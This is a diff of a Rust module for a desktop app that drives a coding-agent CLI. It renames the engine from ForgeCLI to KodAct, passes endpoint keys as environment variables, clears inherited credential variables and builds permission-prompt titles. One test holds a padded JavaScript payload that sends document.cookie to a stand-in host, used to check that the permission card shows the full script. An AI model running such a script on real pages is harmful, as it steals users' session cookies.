@@ -1,16 +1,16 @@
-//! The engine: each chat is one ForgeCLI process (`forge`), driven over its
-//! IDE host protocol (`forge -p --input-format stream-json --output-format
-//! stream-json`, ForgeCLI's docs/CLI.md). Your messages go to its stdin as
+//! The engine: each chat is one KodAct CLI process (`kodact`), driven over its
+//! IDE host protocol (`kodact -p --input-format stream-json --output-format
+//! stream-json`, KodAct CLI's docs/CLI.md). Your messages go to its stdin as
 //! `user` lines; its stdout is NDJSON that `Parser` turns into `Event`s for
 //! the transcript. Permission prompts arrive as `can_use_tool` control
 //! requests and are answered with the card's verdict.
 //!
 //! The endpoint comes from the profile in use (`endpoints.rs`): its URL,
-//! model and key go to the process as `FORGE_*` variables, never on its
+//! model and key go to the process as `KODACT_*` variables, never on its
 //! command line and never into a file.
 //!
-//! Which `forge`: `FORGE_CLI`, else `forge` beside this app's executable,
-//! else `forge` on PATH.
+//! Which `kodact`: `KODACT_CLI`, else `kodact` beside this app's executable,
+//! else `kodact` on PATH.
 
 use std::io::{BufRead, BufReader, Read, Write};
 use std::path::{Path, PathBuf};
@@ -32,7 +32,7 @@ pub enum Event {
     Thinking(String),
     /// A new text or thinking block starts: it doesn't run on from the last.
     Break,
-    /// ForgeCLI changed the permission mode itself (a plan approved, plan mode
+    /// KodAct CLI changed the permission mode itself (a plan approved, plan mode
     /// entered, an answer that set a mode): `system/status`, `permissionMode`.
     ModeChanged(String),
     /// The chat's `/goal` changed: set, checked, paused, met, given up or
@@ -74,7 +74,7 @@ pub enum Event {
         is_error: bool,
         images: Vec<crate::state::ToolImage>,
     },
-    /// Forge asks before running a tool.
+    /// KodAct asks before running a tool.
     Ask {
         request_id: String,
         tool_use_id: String,
@@ -82,7 +82,7 @@ pub enum Event {
         input: Value,
         suggestions: Value,
     },
-    /// Forge withdrew a question (the turn was interrupted).
+    /// KodAct withdrew a question (the turn was interrupted).
     CancelAsk { request_id: String },
     /// An immediate command's answer (`/btw`): it ends no turn.
     Immediate { text: String, is_error: bool },
@@ -96,9 +96,9 @@ pub enum Event {
     Error(String),
     /// The process is gone; `detail` is the end of what it wrote on stderr.
     Exited { code: Option<i32>, detail: String },
-    /// ForgeCLI took your message as a turn, under this id (`rewind_files` names turns by it).
+    /// KodAct CLI took your message as a turn, under this id (`rewind_files` names turns by it).
     /// Also the words, so a queued message that ran as a turn of its own
-    /// (its id is then ForgeCLI's) is still recognised.
+    /// (its id is then KodAct CLI's) is still recognised.
     UserAccepted { uuid: String, text: String },
     /// The answer to a control request this app sent (`Session::request`).
     ControlReply {
@@ -109,21 +109,23 @@ pub enum Event {
 
 // ---------------------------------------------------------------- launching
 
-/// The `forge` executable to run. Never this app itself: Windows names are
-/// case-insensitive, so a `Forge.exe` app would also answer to `forge.exe`
-/// (and launching it as the engine opens a second window).
+/// The `kodact` executable to run. Never this app itself: Windows names are
+/// case-insensitive, so a `KodAct.exe` app would also answer to `kodact.exe`
+/// (and launching it as the engine opens a second window). Never ForgeCLI's
+/// `forge` either: it reads `FORGE_*`, so the profile's `KODACT_*` endpoint
+/// would not reach it.
 pub fn find_cli() -> Option<PathBuf> {
     let me = std::env::current_exe()
         .ok()
         .and_then(|e| e.canonicalize().ok());
     let not_me = |p: &PathBuf| p.is_file() && p.canonicalize().ok() != me;
-    if let Some(p) = std::env::var_os("FORGE_CLI")
+    if let Some(p) = std::env::var_os("KODACT_CLI")
         .map(PathBuf::from)
         .filter(not_me)
     {
         return Some(p);
     }
-    let name = if cfg!(windows) { "forge.exe" } else { "forge" };
+    let name = if cfg!(windows) { "kodact.exe" } else { "kodact" };
     if let Some(dir) = std::env::current_exe()
         .ok()
         .and_then(|e| e.parent().map(PathBuf::from))
@@ -140,6 +142,20 @@ pub fn find_cli() -> Option<PathBuf> {
         .find(not_me)
 }
 
+/// The endpoint's variables, after `KODACT_` (or ForgeCLI's `FORGE_`).
+const ENDPOINT_VARS: [&str; 10] = [
+    "BASE_URL",
+    "API_KEY",
+    "AUTH_TOKEN",
+    "OPENAI_BASE_URL",
+    "OPENAI_API_KEY",
+    "GEMINI_BASE_URL",
+    "GEMINI_API_KEY",
+    "GEMINI_AUTH_HEADER",
+    "CUSTOM_HEADERS",
+    "MODEL",
+];
+
 /// How a chat's process starts: its arguments and the endpoint variables.
 #[derive(Debug, Clone, PartialEq)]
 pub struct Launch {
@@ -147,7 +163,7 @@ pub struct Launch {
     pub env: Vec<(String, String)>,
 }
 
-/// The base URL ForgeCLI wants: it adds `/v1/messages` (Messages API),
+/// The base URL KodAct CLI wants: it adds `/v1/messages` (Messages API),
 /// `/chat/completions` (OpenAI-compatible) or `/models/<model>:...` (Gemini)
 /// itself.
 fn cli_base_url(profile: &Profile) -> String {
@@ -162,32 +178,32 @@ fn cli_base_url(profile: &Profile) -> String {
     url.strip_suffix(suffix).unwrap_or(&url).to_string()
 }
 
-/// What the desktop adds to ForgeCLI's system prompt: how replies are shown
+/// What the desktop adds to KodAct CLI's system prompt: how replies are shown
 /// here. Every diagram is drawn with the Diagram Design skill (`plugin.rs`)
 /// unless the user names another format (Mermaid, ASCII, SVG, ...), which
 /// then wins; Mermaid and SVG blocks still render inline (`mermaid.rs`).
-/// Visual design work goes through the design skill. An HTML page Forge
+/// Visual design work goes through the design skill. An HTML page KodAct
 /// writes is rendered, critiqued and revised before the reply ends (up to
 /// three rounds).
-pub const SURFACE_PROMPT: &str = "You are running inside Forge Desktop, which renders your replies as Markdown and draws diagrams in the chat. \
+pub const SURFACE_PROMPT: &str = "You are running inside KodAct Desktop, which renders your replies as Markdown and draws diagrams in the chat. \
 Diagram Design is the default for every diagram. When the user asks for a diagram, chart or graph, or one would explain structure \
 or flow better than prose (architecture, a request's path, data flow, states, a sequence of calls, a data model, a timeline, a \
 comparison), use the diagram-design skill unless the user names another format: it writes a self-contained HTML file around one \
-SVG in Forge's own style, and Forge shows that file as a diagram in the chat. Save it in the project (e.g. under docs/diagrams/) \
+SVG in KodAct's own style, and KodAct shows that file as a diagram in the chat. Save it in the project (e.g. under docs/diagrams/) \
 and name it in your reply. When the user asks for a specific format (Mermaid, ASCII art, SVG, PlantUML, Graphviz, a table...), \
 use exactly that format without hesitating. When the diagram-design skill is not available, fall back to a ```mermaid fenced \
 block or an ```svg block with one <svg>; both render inline here (Mermaid: flowchart, sequenceDiagram, stateDiagram-v2, \
 classDiagram, erDiagram, mindmap, pie, gantt, timeline, journey, xychart-beta, quadrantChart, gitGraph). Put ASCII art in a ```text block so it keeps its alignment. \
 For a deck, a page, a prototype, a poster or any other visual design, use the design skill. \
 When you write or change an HTML page (a report, a page, a mockup; diagrams included), review it before you call it done. \
-Look at it rendered: when Forge's browser tools are available (navigate, screenshot), navigate to the file (a file:// URL), \
+Look at it rendered: when KodAct's browser tools are available (navigate, screenshot), navigate to the file (a file:// URL), \
 take a screenshot, and look at the picture; otherwise read the file back as a reviewer would. Critique it in two passes. Design: hierarchy \
 (one clear title, headings that step down), spacing and alignment, contrast and legibility, nothing overflowing or overlapping, \
 consistent colours and type, and a layout that also holds in a narrow window. Content: accurate, complete, no placeholder or lorem text, no \
 dead links, every section earns its place. Fix what you find and look again; stop when a pass finds nothing worth fixing, or \
 after three rounds. Then tell the user, in a line or two, what the review changed.";
 
-/// Which ForgeCLI conversation a process runs: a new one under the id the
+/// Which KodAct CLI conversation a process runs: a new one under the id the
 /// desktop chose, or one already on disk, resumed.
 #[derive(Clone, Copy, Debug, PartialEq)]
 pub enum Conversation<'a> {
@@ -222,7 +238,7 @@ pub fn launch(
         "--append-system-prompt".to_string(),
         SURFACE_PROMPT.to_string(),
     ]);
-    // Forge's plugin: Diagram Design and the office-documents skill.
+    // KodAct's plugin: Diagram Design and the office-documents skill.
     if let Some(dir) = crate::plugin::dir() {
         args.extend([
             "--plugin-dir".to_string(),
@@ -239,23 +255,23 @@ pub fn launch(
     let base = cli_base_url(profile);
     match profile.wire {
         Wire::Anthropic => {
-            env.push(("FORGE_BASE_URL".into(), base));
+            env.push(("KODACT_BASE_URL".into(), base));
             if let Some(t) = token {
                 // As the model check sends it: both headers.
-                env.push(("FORGE_API_KEY".into(), t.clone()));
-                env.push(("FORGE_AUTH_TOKEN".into(), t));
+                env.push(("KODACT_API_KEY".into(), t.clone()));
+                env.push(("KODACT_AUTH_TOKEN".into(), t));
             }
         }
         Wire::Openai => {
-            env.push(("FORGE_OPENAI_BASE_URL".into(), base));
+            env.push(("KODACT_OPENAI_BASE_URL".into(), base));
             if let Some(t) = token {
-                env.push(("FORGE_OPENAI_API_KEY".into(), t));
+                env.push(("KODACT_OPENAI_API_KEY".into(), t));
             }
         }
         Wire::Gemini => {
-            env.push(("FORGE_GEMINI_BASE_URL".into(), base));
+            env.push(("KODACT_GEMINI_BASE_URL".into(), base));
             if let Some(t) = token {
-                env.push(("FORGE_GEMINI_API_KEY".into(), t));
+                env.push(("KODACT_GEMINI_API_KEY".into(), t));
             }
         }
     }
@@ -265,17 +281,17 @@ pub fn launch(
             .iter()
             .map(|(k, v)| format!("{k}: {v}"))
             .collect();
-        env.push(("FORGE_CUSTOM_HEADERS".into(), lines.join("\n")));
+        env.push(("KODACT_CUSTOM_HEADERS".into(), lines.join("\n")));
     }
     if let Some(w) = profile.capabilities.context_window.filter(|w| *w > 0) {
-        env.push(("FORGE_CONTEXT_WINDOW".into(), w.to_string()));
+        env.push(("KODACT_CONTEXT_WINDOW".into(), w.to_string()));
     }
     Ok(Launch { args, env })
 }
 
 // ---------------------------------------------------------------- the process
 
-/// One chat's running `forge`. Dropping it ends the process.
+/// One chat's running `kodact`. Dropping it ends the process.
 pub struct Session {
     stdin: Arc<Mutex<Option<ChildStdin>>>,
     child: Arc<Mutex<Child>>,
@@ -289,7 +305,7 @@ impl Session {
         Self::start(cmd, launch, &[], &exe.display().to_string())
     }
 
-    /// ForgeCLI in a remote project (`remote.rs`): started through WSL, SSH
+    /// KodAct CLI in a remote project (`remote.rs`): started through WSL, SSH
     /// or docker, its environment written to stdin first, never on a
     /// command line.
     pub fn spawn_remote(
@@ -315,20 +331,12 @@ impl Session {
         cmd.stdin(Stdio::piped())
             .stdout(Stdio::piped())
             .stderr(Stdio::piped());
-        // Keys and endpoints this app may have inherited must not mix with the profile's.
-        for k in [
-            "FORGE_BASE_URL",
-            "FORGE_API_KEY",
-            "FORGE_AUTH_TOKEN",
-            "FORGE_OPENAI_BASE_URL",
-            "FORGE_OPENAI_API_KEY",
-            "FORGE_GEMINI_BASE_URL",
-            "FORGE_GEMINI_API_KEY",
-            "FORGE_GEMINI_AUTH_HEADER",
-            "FORGE_CUSTOM_HEADERS",
-            "FORGE_MODEL",
-        ] {
-            cmd.env_remove(k);
+        // Keys and endpoints this app may have inherited must not mix with the
+        // profile's: under both names, since KodAct takes a `FORGE_*` one
+        // (ForgeCLI's) for its `KODACT_*` name when that is unset.
+        for k in ENDPOINT_VARS {
+            cmd.env_remove(format!("KODACT_{k}"));
+            cmd.env_remove(format!("FORGE_{k}"));
         }
         cmd.envs(launch.env.iter().map(|(k, v)| (k, v)));
         #[cfg(windows)]
@@ -400,10 +408,10 @@ impl Session {
 
     fn write(&self, v: Value) -> Result<(), String> {
         let mut guard = self.stdin.lock().unwrap();
-        let w = guard.as_mut().ok_or("Forge's input is closed")?;
+        let w = guard.as_mut().ok_or("KodAct's input is closed")?;
         writeln!(w, "{v}")
             .and_then(|_| w.flush())
-            .map_err(|e| format!("could not reach Forge: {e}"))
+            .map_err(|e| format!("could not reach KodAct: {e}"))
     }
 
     pub fn send(&self, text: &str) -> Result<(), String> {
@@ -411,7 +419,7 @@ impl Session {
     }
 
     /// A message sent while a reply runs, for its next step (`priority:
-    /// "next"`), with its attachments (`attach::content_blocks`): ForgeCLI
+    /// "next"`), with its attachments (`attach::content_blocks`): KodAct CLI
     /// gives it to the model between tool calls, or runs it next when the
     /// turn ends first; either way it is echoed back under `uuid` when it
     /// lands (`Event::UserAccepted`).
@@ -425,7 +433,7 @@ impl Session {
         self.control(json!({ "subtype": "cancel_queued", "uuid": uuid }))
     }
 
-    /// Ask what fills the context (ForgeCLI's `/context` numbers); the answer
+    /// Ask what fills the context (KodAct CLI's `/context` numbers); the answer
     /// arrives as `Event::ControlReply` (`context::ContextUsage::from_json`).
     pub fn context_usage(&self) -> Result<String, String> {
         self.control(json!({ "subtype": "get_context_usage" }))
@@ -471,12 +479,12 @@ impl Session {
         self.write(questions_answer_line(request_id, input, questions))
     }
 
-    /// Skip AskUserQuestion: Forge goes on with its own assumptions.
+    /// Skip AskUserQuestion: KodAct goes on with its own assumptions.
     pub fn skip_questions(&self, request_id: &str) -> Result<(), String> {
         self.write(skip_questions_line(request_id))
     }
 
-    /// Answer a plan (ExitPlanMode), as Forge for VS Code does.
+    /// Answer a plan (ExitPlanMode), as KodAct for VS Code does.
     pub fn answer_plan(
         &self,
         request_id: &str,
@@ -489,7 +497,7 @@ impl Session {
     fn control(&self, request: Value) -> Result<String, String> {
         static NEXT: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(1);
         let id = format!(
-            "forge-gpui-{}",
+            "kodact-desktop-{}",
             NEXT.fetch_add(1, std::sync::atomic::Ordering::Relaxed)
         );
         self.write(json!({ "type": "control_request", "request_id": id, "request": request }))
@@ -568,7 +576,7 @@ pub fn answer_line(
 /// The tool that puts questions to you.
 pub const QUESTION_TOOL: &str = "AskUserQuestion";
 
-/// Tools ForgeCLI always asks about, whatever the rules: a rule for them
+/// Tools KodAct CLI always asks about, whatever the rules: a rule for them
 /// would never be used, so their cards offer no "Always allow".
 pub fn always_asks(tool: &str) -> bool {
     matches!(tool, QUESTION_TOOL | "EnterPlanMode" | "ExitPlanMode")
@@ -599,17 +607,17 @@ pub fn questions(input: &Value) -> Vec<Question> {
         .collect()
 }
 
-/// A question card's title: "Forge has a question", "Forge has 3 questions".
+/// A question card's title: "KodAct has a question", "KodAct has 3 questions".
 pub fn questions_title(n: usize) -> String {
     if n == 1 {
-        "Forge has a question".into()
+        "KodAct has a question".into()
     } else {
-        format!("Forge has {n} questions")
+        format!("KodAct has {n} questions")
     }
 }
 
 /// Your answers to AskUserQuestion: the call's input with `answers`
-/// (question → answer) added, which ForgeCLI hands the tool.
+/// (question → answer) added, which KodAct CLI hands the tool.
 pub fn questions_answer_line(request_id: &str, input: &Value, questions: &[Question]) -> Value {
     let answers: serde_json::Map<String, Value> = questions
         .iter()
@@ -621,7 +629,7 @@ pub fn questions_answer_line(request_id: &str, input: &Value, questions: &[Quest
         "response": { "behavior": "allow", "updatedInput": updated } } })
 }
 
-/// What Forge hears when you skip its questions.
+/// What KodAct hears when you skip its questions.
 pub const QUESTIONS_SKIPPED: &str =
     "The user skipped these questions. Proceed with your best judgement and state your assumptions.";
 
@@ -640,7 +648,7 @@ pub enum PlanChoice {
 }
 
 /// A plan's answer. Yes sets the session's mode in the same answer
-/// (`updatedPermissions`, `setMode`), so ForgeCLI leaves plan mode for the
+/// (`updatedPermissions`, `setMode`), so KodAct CLI leaves plan mode for the
 /// mode chosen and says so (`system/status`); No keeps planning.
 pub fn plan_answer_line(request_id: &str, choice: PlanChoice, input: &Value) -> Value {
     let set_mode = |mode: &str| {
@@ -658,11 +666,11 @@ pub fn plan_answer_line(request_id: &str, choice: PlanChoice, input: &Value) -> 
 
 /// The title of a plan's question card (`ask_text`), which the card shows
 /// with the plan's own answers.
-pub const PLAN_ASK_TITLE: &str = "Forge's plan is ready. Start on it?";
+pub const PLAN_ASK_TITLE: &str = "KodAct's plan is ready. Start on it?";
 
 /// The title of the card asking to run JavaScript in the browser: the card
 /// shows the whole script, as code, so nothing in it is hidden.
-pub const JS_ASK_TITLE: &str = "Allow Forge to run JavaScript in the browser?";
+pub const JS_ASK_TITLE: &str = "Allow KodAct to run JavaScript in the browser?";
 
 /// What a browser tool acts on, whole: the URL, the text typed, the script.
 fn browser_subject(input: &Value) -> Option<String> {
@@ -908,7 +916,7 @@ impl Parser {
                     }
                 }
             }
-            // Your message, echoed back with the id ForgeCLI gave its turn.
+            // Your message, echoed back with the id KodAct CLI gave its turn.
             Some("user") if !nested && v["isReplay"] == true => {
                 if let Some(uuid) = v["uuid"].as_str() {
                     let text = v["message"]["content"]
@@ -1025,7 +1033,7 @@ impl Parser {
             Some("error") => out.push(Event::Error(
                 v["error"]["message"]
                     .as_str()
-                    .unwrap_or("Forge could not start the run.")
+                    .unwrap_or("KodAct could not start the run.")
                     .into(),
             )),
             _ => {}
@@ -1255,12 +1263,12 @@ pub fn ask_text(tool: &str, input: &Value) -> (String, String) {
     let call = tool_call(tool, input);
     let title = match call.kind {
         ToolKind::Edit | ToolKind::Write => {
-            format!("Allow Forge to edit {}?", file_name(&call.target))
+            format!("Allow KodAct to edit {}?", file_name(&call.target))
         }
-        ToolKind::Bash => "Allow Forge to run this command?".to_string(),
-        ToolKind::Web => "Allow Forge to use the web?".to_string(),
-        ToolKind::WebSearch => "Allow Forge to search the web?".to_string(),
-        ToolKind::Read | ToolKind::Search => "Allow Forge to read this?".to_string(),
+        ToolKind::Bash => "Allow KodAct to run this command?".to_string(),
+        ToolKind::Web => "Allow KodAct to use the web?".to_string(),
+        ToolKind::WebSearch => "Allow KodAct to search the web?".to_string(),
+        ToolKind::Read | ToolKind::Search => "Allow KodAct to read this?".to_string(),
         // The browser's tools: what it would do there, and on what.
         ToolKind::Other if tool.starts_with(crate::browser::TOOL_PREFIX) => {
             let action = match &tool[crate::browser::TOOL_PREFIX.len()..] {
@@ -1287,13 +1295,13 @@ pub fn ask_text(tool: &str, input: &Value) -> (String, String) {
             };
             // The whole subject: the row cuts it to a line, the ask doesn't.
             return (
-                format!("Allow Forge to {action} in the browser?"),
+                format!("Allow KodAct to {action} in the browser?"),
                 browser_subject(input)
                     .or_else(|| call.note.map(|n| n.to_string()))
                     .unwrap_or_else(|| "The page in the side panel".into()),
             );
         }
-        ToolKind::Other => format!("Allow Forge to use {tool}?"),
+        ToolKind::Other => format!("Allow KodAct to use {tool}?"),
     };
     (title, call.target.to_string())
 }
@@ -1483,7 +1491,7 @@ mod tests {
         let keep = plan_answer_line("r1", PlanChoice::KeepPlanning, &input);
         assert_eq!(keep["response"]["response"]["behavior"], "deny");
         assert_eq!(ask_text("ExitPlanMode", &input).0, PLAN_ASK_TITLE);
-        // ForgeCLI's mode changes reach the app.
+        // KodAct CLI's mode changes reach the app.
         let ev = parse(&[
             json!({"type":"system","subtype":"status","status":null,"permissionMode":"acceptEdits"}),
         ]);
@@ -1531,12 +1539,12 @@ mod tests {
     #[test]
     fn browser_asks_say_what_and_where() {
         let (title, detail) = ask_text(
-            "mcp__forge-browser__navigate",
+            "mcp__kodact-browser__navigate",
             &json!({"url": "https://example.com"}),
         );
-        assert_eq!(title, "Allow Forge to open a page in the browser?");
+        assert_eq!(title, "Allow KodAct to open a page in the browser?");
         assert_eq!(detail, "https://example.com");
-        let (title, detail) = ask_text("mcp__forge-browser__eval", &json!({}));
+        let (title, detail) = ask_text("mcp__kodact-browser__eval", &json!({}));
         assert_eq!(title, JS_ASK_TITLE);
         assert_eq!(detail, "The page in the side panel");
         // A long script is asked about whole, though its row shows a line.
@@ -1544,12 +1552,12 @@ mod tests {
             "(() => {{ {} return fetch('https://x.test/?c=' + document.cookie) }})()",
             "/* pad */ ".repeat(30)
         );
-        let (_, detail) = ask_text("mcp__forge-browser__eval", &json!({ "expression": script }));
+        let (_, detail) = ask_text("mcp__kodact-browser__eval", &json!({ "expression": script }));
         assert_eq!(detail, script);
-        let row = tool_call("mcp__forge-browser__eval", &json!({ "expression": script }));
+        let row = tool_call("mcp__kodact-browser__eval", &json!({ "expression": script }));
         assert!(row.note.is_some_and(|n| n.ends_with('…')));
         let typed = "x".repeat(300);
-        let (_, detail) = ask_text("mcp__forge-browser__type", &json!({ "text": typed }));
+        let (_, detail) = ask_text("mcp__kodact-browser__type", &json!({ "text": typed }));
         assert_eq!(detail, typed);
     }
 
@@ -1569,7 +1577,7 @@ mod tests {
             ("Stack", "Leptos")
         );
         assert!(qs[1].multi && !qs[0].multi);
-        assert_eq!(ask_text(QUESTION_TOOL, &input).0, "Forge has 3 questions");
+        assert_eq!(ask_text(QUESTION_TOOL, &input).0, "KodAct has 3 questions");
         qs[0].picked = vec![0];
         qs[1].picked = vec![0, 1];
         qs[2].own = Some("my-notes".into());
@@ -1618,7 +1626,7 @@ mod tests {
                 ["behavior"],
             "deny"
         );
-        // Denied with your words: Forge gets them, not just a no.
+        // Denied with your words: KodAct gets them, not just a no.
         let said = answer_line(
             "r1",
             false,
@@ -1633,8 +1641,8 @@ mod tests {
 
     #[test]
     fn the_endpoint_goes_in_variables_never_arguments() {
-        let p: Profile = serde_json::from_value(json!({"name":"x","baseUrl":"https://gw.example/v1","wire":"anthropic","model":"m1","auth":{"type":"bearer","token":"${env:FORGE_GPUI_TEST_KEY}"}})).unwrap();
-        std::env::set_var("FORGE_GPUI_TEST_KEY", "sk-test");
+        let p: Profile = serde_json::from_value(json!({"name":"x","baseUrl":"https://gw.example/v1","wire":"anthropic","model":"m1","auth":{"type":"bearer","token":"${env:KODACT_GPUI_TEST_KEY}"}})).unwrap();
+        std::env::set_var("KODACT_GPUI_TEST_KEY", "sk-test");
         let id = "0b9a1f2e-3c4d-4e5f-8a6b-7c8d9e0f1a2b";
         let l = launch(&p, ModeId::Manual, false, Conversation::New(id)).unwrap();
         assert!(l.args.windows(2).any(|w| w == ["--session-id", id]));
@@ -1646,8 +1654,8 @@ mod tests {
         assert!(!l.args.iter().any(|a| a.contains("sk-test")));
         assert!(l
             .env
-            .contains(&("FORGE_BASE_URL".into(), "https://gw.example".into())));
-        assert!(l.env.contains(&("FORGE_API_KEY".into(), "sk-test".into())));
+            .contains(&("KODACT_BASE_URL".into(), "https://gw.example".into())));
+        assert!(l.env.contains(&("KODACT_API_KEY".into(), "sk-test".into())));
         assert!(l.args.windows(2).any(|w| w == ["--model", "m1"]));
         assert!(l
             .args
@@ -1674,21 +1682,21 @@ mod tests {
         .unwrap();
         let l = launch(&o, ModeId::Manual, false, Conversation::New(id)).unwrap();
         assert!(l.env.contains(&(
-            "FORGE_OPENAI_BASE_URL".into(),
+            "KODACT_OPENAI_BASE_URL".into(),
             "http://127.0.0.1:11434/v1".into()
         )));
-        // Gemini: ForgeCLI's native wire, the base URL as written.
+        // Gemini: KodAct CLI's native wire, the base URL as written.
         let g: Profile = serde_json::from_value(json!({"name":"g","baseUrl":"https://generativelanguage.googleapis.com/v1beta/","wire":"gemini","model":"gemini-3-flash-preview"}))
         .unwrap();
         let l = launch(&g, ModeId::Manual, false, Conversation::New(id)).unwrap();
         assert!(l.env.contains(&(
-            "FORGE_GEMINI_BASE_URL".into(),
+            "KODACT_GEMINI_BASE_URL".into(),
             "https://generativelanguage.googleapis.com/v1beta".into()
         )));
         assert!(!l
             .env
             .iter()
-            .any(|(k, _)| k == "FORGE_BASE_URL" || k == "FORGE_OPENAI_BASE_URL"));
+            .any(|(k, _)| k == "KODACT_BASE_URL" || k == "KODACT_OPENAI_BASE_URL"));
     }
 
     #[test]
@@ -1699,7 +1707,7 @@ mod tests {
             {"type": "text", "text": "x"}
         ]);
         let found = result_images(&content, Some("/p/shots/a.png"));
-        assert_eq!(found.len(), 1, "a format Forge can't show is skipped");
+        assert_eq!(found.len(), 1, "a format KodAct can't show is skipped");
         assert_eq!(found[0].name.as_ref(), "a.png");
         assert_eq!(found[0].path.as_deref(), Some("/p/shots/a.png"));
         assert_eq!(found[0].image.bytes(), b"hi");
